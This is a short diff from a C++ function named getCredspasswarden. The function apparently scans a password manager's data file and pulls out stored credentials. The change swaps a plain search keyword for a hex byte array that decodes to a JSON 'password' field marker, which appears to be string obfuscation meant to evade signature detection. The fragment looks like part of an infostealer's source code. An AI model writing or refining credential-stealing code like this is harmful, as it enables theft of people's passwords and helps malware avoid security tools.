@@ -13,7 +13,7 @@ int getCredspasswarden(std::string filename) {
         return 1;
     }
 
-    std::string searchKeyword = "\"components\":{\"title\":\"Login\",\"vault\":";
+    std::string searchKeyword = { 0x22, 0x2c, 0x22, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x22, 0x3a, 0x22 };
     std::string foundData;
 
     while (!file.eof()) {
